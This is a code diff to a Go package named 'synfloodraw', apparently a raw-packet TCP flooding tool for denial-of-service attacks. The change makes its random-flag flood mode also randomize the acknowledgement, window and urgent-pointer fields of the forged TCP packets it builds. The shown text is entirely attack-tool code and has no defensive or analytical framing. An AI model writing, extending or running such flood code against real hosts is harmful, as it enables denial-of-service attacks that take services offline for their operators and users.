@@ -2,6 +2,7 @@ package synfloodraw
 
 import (
 	"fmt"
+	"math"
 	"math/rand"
 	"net"
 	"time"
@@ -111,6 +112,9 @@ func buildIpPacket(srcIpStr, dstIpStr string) *layers.IPv4 {
 func buildTcpPacket(srcPort, dstPort int, floodType string) *layers.TCP {
 	var isSyn, isAck, isFin, isRst, isPsh, isUrg, isEce, isCwr, isNs bool
 	var SeqNum uint32 = 1105024978
+	var Ack uint32 = 0
+	var Window uint16 = 14600
+	var Urgent uint16 = 0
 	switch floodType {
 	case TypeSyn:
 		isSyn = true
@@ -130,26 +134,31 @@ func buildTcpPacket(srcPort, dstPort int, floodType string) *layers.TCP {
 		isCwr = rand.Intn(100) < 10
 		isNs = rand.Intn(100) < 5
 		SeqNum = rand.Uint32()
+		if isAck {
+			Ack = rand.Uint32()
+		}
+		Window = uint16(rand.Intn(math.MaxUint16))
+		if isUrg {
+			Urgent = uint16(rand.Intn(math.MaxUint16))
+		}
 	}
 
 	return &layers.TCP{
 		SrcPort: layers.TCPPort(srcPort),
 		DstPort: layers.TCPPort(dstPort),
-		//Window:  1505,
-		Window: 14600,
-		// Urgent:  0,
-		//Seq:     11050,
-		Seq: SeqNum,
-		// Ack:     0,
-		SYN: isSyn,
-		ACK: isAck,
-		FIN: isFin,
-		RST: isRst,
-		PSH: isPsh,
-		URG: isUrg,
-		ECE: isEce,
-		CWR: isCwr,
-		NS:  isNs,
+		Window:  Window,
+		Urgent:  Urgent,
+		Seq:     SeqNum,
+		Ack:     Ack,
+		SYN:     isSyn,
+		ACK:     isAck,
+		FIN:     isFin,
+		RST:     isRst,
+		PSH:     isPsh,
+		URG:     isUrg,
+		ECE:     isEce,
+		CWR:     isCwr,
+		NS:      isNs,
 	}
 }
 
